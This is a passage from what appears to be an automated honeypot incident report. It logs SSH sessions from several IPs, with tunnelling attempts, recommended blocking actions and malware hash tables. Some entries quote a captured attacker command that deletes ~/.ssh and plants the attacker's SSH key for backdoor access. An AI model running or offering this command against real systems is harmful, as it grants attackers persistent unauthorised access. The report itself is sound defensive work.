| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:49:55` | `cowrie.session.connect` |
| `2026-08-26 01:49:55` | `cowrie.client.version` |
| `2026-08-26 01:49:56` | `cowrie.client.kex` |
| `2026-08-26 01:49:57` | `cowrie.login.success` |
| `2026-08-26 01:49:57` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:49:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:49:57` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:49:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8287c05cbb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:49 |
| **Last Seen** | 2026-08-26 01:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:49:59` | `cowrie.session.connect` |
| `2026-08-26 01:49:59` | `cowrie.client.version` |
| `2026-08-26 01:50:00` | `cowrie.client.kex` |
| `2026-08-26 01:50:00` | `cowrie.login.success` |
| `2026-08-26 01:50:01` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:50:01` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:50:01` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8046ca03186f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:59 |
| **Last Seen** | 2026-08-26 01:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:59:13` | `cowrie.session.connect` |
| `2026-08-26 01:59:13` | `cowrie.client.version` |
| `2026-08-26 01:59:13` | `cowrie.client.kex` |
| `2026-08-26 01:59:14` | `cowrie.login.success` |
| `2026-08-26 01:59:14` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:59:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:59:14` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5e063b3005

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 01:59 |
| **Last Seen** | 2026-08-26 01:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 01:59:16` | `cowrie.session.connect` |
| `2026-08-26 01:59:16` | `cowrie.client.version` |
| `2026-08-26 01:59:16` | `cowrie.client.kex` |
| `2026-08-26 01:59:17` | `cowrie.login.success` |
| `2026-08-26 01:59:17` | `cowrie.direct-tcpip.request` |
| `2026-08-26 01:59:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 01:59:17` | `cowrie.direct-tcpip.data` |
| `2026-08-26 01:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75c282861eb5

| Field | Detail |
|---|---|
| **Source IP** | `104.234.138[.]25` |
| **First Seen** | 2026-08-26 02:08 |
| **Last Seen** | 2026-08-26 02:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:08:31` | `cowrie.session.connect` |
| `2026-08-26 02:08:31` | `cowrie.client.version` |
| `2026-08-26 02:08:31` | `cowrie.client.kex` |
| `2026-08-26 02:08:32` | `cowrie.login.success` |
| `2026-08-26 02:08:32` | `cowrie.session.params` |
| `2026-08-26 02:08:32` | `cowrie.command.input` |
| `2026-08-26 02:08:32` | `cowrie.command.failed` |
| `2026-08-26 02:08:33` | `cowrie.log.closed` |
| `2026-08-26 02:08:33` | `cowrie.session.params` |
| `2026-08-26 02:08:33` | `cowrie.command.input` |
| `2026-08-26 02:08:34` | `cowrie.session.file_download` |
| `2026-08-26 02:08:34` | `cowrie.log.closed` |
| `2026-08-26 02:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.234.138[.]25` to AbuseIPDB if not already reported
- [ ] Block `104.234.138[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c19d0bd7c5cb

| Field | Detail |
|---|---|
| **Source IP** | `104.234.138[.]25` |
| **First Seen** | 2026-08-26 02:08 |
| **Last Seen** | 2026-08-26 02:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:08:34` | `cowrie.session.connect` |
| `2026-08-26 02:08:34` | `cowrie.client.version` |
| `2026-08-26 02:08:34` | `cowrie.client.kex` |
| `2026-08-26 02:08:34` | `cowrie.login.success` |
| `2026-08-26 02:08:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.234.138[.]25` to AbuseIPDB if not already reported
- [ ] Block `104.234.138[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3ec994dc61

| Field | Detail |
|---|---|
| **Source IP** | `104.234.138[.]25` |
| **First Seen** | 2026-08-26 02:08 |
| **Last Seen** | 2026-08-26 02:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:08:34` | `cowrie.session.connect` |
| `2026-08-26 02:08:34` | `cowrie.client.version` |
| `2026-08-26 02:08:34` | `cowrie.client.kex` |
| `2026-08-26 02:08:35` | `cowrie.login.success` |
| `2026-08-26 02:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.234.138[.]25` to AbuseIPDB if not already reported
- [ ] Block `104.234.138[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-336666d4ed80

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:08 |
| **Last Seen** | 2026-08-26 02:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:08:36` | `cowrie.session.connect` |
| `2026-08-26 02:08:36` | `cowrie.client.version` |
| `2026-08-26 02:08:37` | `cowrie.client.kex` |
| `2026-08-26 02:08:37` | `cowrie.login.success` |
| `2026-08-26 02:08:38` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:08:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:08:38` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae6b9d73ee1f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:08 |
| **Last Seen** | 2026-08-26 02:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:08:41` | `cowrie.session.connect` |
| `2026-08-26 02:08:41` | `cowrie.client.version` |
| `2026-08-26 02:08:41` | `cowrie.client.kex` |
| `2026-08-26 02:08:42` | `cowrie.login.success` |
| `2026-08-26 02:08:42` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:08:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:08:42` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8393fa4a2fa6

| Field | Detail |
|---|---|
| **Source IP** | `106.75.25[.]139` |
| **First Seen** | 2026-08-26 02:13 |
| **Last Seen** | 2026-08-26 02:18 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:13:42` | `cowrie.session.connect` |
| `2026-08-26 02:13:42` | `cowrie.client.version` |
| `2026-08-26 02:13:42` | `cowrie.client.kex` |
| `2026-08-26 02:13:43` | `cowrie.login.success` |
| `2026-08-26 02:13:44` | `cowrie.session.params` |
| `2026-08-26 02:13:44` | `cowrie.command.input` |
| `2026-08-26 02:13:44` | `cowrie.command.failed` |
| `2026-08-26 02:13:45` | `cowrie.log.closed` |
| `2026-08-26 02:13:46` | `cowrie.session.params` |
| `2026-08-26 02:13:46` | `cowrie.command.input` |
| `2026-08-26 02:13:46` | `cowrie.session.file_download` |
| `2026-08-26 02:13:46` | `cowrie.log.closed` |
| `2026-08-26 02:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.25[.]139` to AbuseIPDB if not already reported
- [ ] Block `106.75.25[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49225d97b169

| Field | Detail |
|---|---|
| **Source IP** | `106.75.25[.]139` |
| **First Seen** | 2026-08-26 02:13 |
| **Last Seen** | 2026-08-26 02:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:13:46` | `cowrie.session.connect` |
| `2026-08-26 02:13:46` | `cowrie.client.version` |
| `2026-08-26 02:13:47` | `cowrie.client.kex` |
| `2026-08-26 02:13:48` | `cowrie.login.success` |
| `2026-08-26 02:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.25[.]139` to AbuseIPDB if not already reported
- [ ] Block `106.75.25[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6717afa2e8fc

| Field | Detail |
|---|---|
| **Source IP** | `106.75.25[.]139` |
| **First Seen** | 2026-08-26 02:13 |
| **Last Seen** | 2026-08-26 02:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:13:49` | `cowrie.session.connect` |
| `2026-08-26 02:13:49` | `cowrie.client.version` |
| `2026-08-26 02:13:49` | `cowrie.client.kex` |
| `2026-08-26 02:13:50` | `cowrie.login.success` |
| `2026-08-26 02:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.25[.]139` to AbuseIPDB if not already reported
- [ ] Block `106.75.25[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0ef39405752

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:18 |
| **Last Seen** | 2026-08-26 02:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:18:11` | `cowrie.session.connect` |
| `2026-08-26 02:18:11` | `cowrie.client.version` |
| `2026-08-26 02:18:11` | `cowrie.client.kex` |
| `2026-08-26 02:18:12` | `cowrie.login.success` |
| `2026-08-26 02:18:12` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:18:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:18:12` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d92c92c57d79

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:18 |
| **Last Seen** | 2026-08-26 02:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:18:15` | `cowrie.session.connect` |
| `2026-08-26 02:18:15` | `cowrie.client.version` |
| `2026-08-26 02:18:15` | `cowrie.client.kex` |
| `2026-08-26 02:18:16` | `cowrie.login.success` |
| `2026-08-26 02:18:16` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:18:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:18:16` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:18:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de3948369a9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:27 |
| **Last Seen** | 2026-08-26 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:27:31` | `cowrie.session.connect` |
| `2026-08-26 02:27:31` | `cowrie.client.version` |
| `2026-08-26 02:27:31` | `cowrie.client.kex` |
| `2026-08-26 02:27:32` | `cowrie.login.success` |
| `2026-08-26 02:27:32` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:27:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:27:32` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81de3f1e766c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:27 |
| **Last Seen** | 2026-08-26 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:27:34` | `cowrie.session.connect` |
| `2026-08-26 02:27:34` | `cowrie.client.version` |
| `2026-08-26 02:27:34` | `cowrie.client.kex` |
| `2026-08-26 02:27:35` | `cowrie.login.success` |
| `2026-08-26 02:27:35` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:27:36` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:27:36` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:27:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee8cf17576c4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:36 |
| **Last Seen** | 2026-08-26 02:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:36:57` | `cowrie.session.connect` |
| `2026-08-26 02:36:57` | `cowrie.client.version` |
| `2026-08-26 02:36:57` | `cowrie.client.kex` |
| `2026-08-26 02:36:58` | `cowrie.login.success` |
| `2026-08-26 02:36:59` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:36:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:36:59` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1b1e2420923

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:37 |
| **Last Seen** | 2026-08-26 02:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:37:01` | `cowrie.session.connect` |
| `2026-08-26 02:37:01` | `cowrie.client.version` |
| `2026-08-26 02:37:01` | `cowrie.client.kex` |
| `2026-08-26 02:37:02` | `cowrie.login.success` |
| `2026-08-26 02:37:02` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:37:03` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:37:03` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:37:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b12b27ea4f3b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:46 |
| **Last Seen** | 2026-08-26 02:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:46:24` | `cowrie.session.connect` |
| `2026-08-26 02:46:24` | `cowrie.client.version` |
| `2026-08-26 02:46:24` | `cowrie.client.kex` |
| `2026-08-26 02:46:25` | `cowrie.login.success` |
| `2026-08-26 02:46:25` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:46:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:46:25` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee001f436c96

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-26 02:46 |
| **Last Seen** | 2026-08-26 02:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 02:46:28` | `cowrie.session.connect` |
| `2026-08-26 02:46:28` | `cowrie.client.version` |
| `2026-08-26 02:46:28` | `cowrie.client.kex` |
| `2026-08-26 02:46:29` | `cowrie.login.success` |
| `2026-08-26 02:46:29` | `cowrie.direct-tcpip.request` |
| `2026-08-26 02:46:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-26 02:46:30` | `cowrie.direct-tcpip.data` |
| `2026-08-26 02:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.138[.]44` | **34** | 2026-08-26 01:06 | 2026-08-26 02:46 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-08-26 01:11 | 2026-08-26 02:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `118.193.44[.]104` | **4** | 2026-08-26 02:34 | 2026-08-26 02:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `219.250.145[.]12` | **3** | 2026-08-26 01:13 | 2026-08-26 01:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `79.11.39[.]204` | **3** | 2026-08-26 02:06 | 2026-08-26 02:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.126[.]161` | **2** | 2026-08-26 01:13 | 2026-08-26 01:15 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-08-26 01:13 | 2026-08-26 02:14 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `100.55.74[.]174` | 1 | 2026-08-26 01:18 | 2026-08-26 01:18 | 2s | 0 | `T1592` | 🟢 LOW |
| `109.62.96[.]205` | 1 | 2026-08-26 02:39 | 2026-08-26 02:39 | 13s | 0 | `T1592` | 🟢 LOW |
| `134.209.229[.]23` | 1 | 2026-08-26 02:48 | 2026-08-26 02:50 | 103s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-08-26 01:45 | 2026-08-26 01:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-08-26 01:18 | 2026-08-26 01:18 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]82` | 1 | 2026-08-26 02:47 | 2026-08-26 02:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `93.170.162[.]68` | 1 | 2026-08-26 02:55 | 2026-08-26 02:55 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
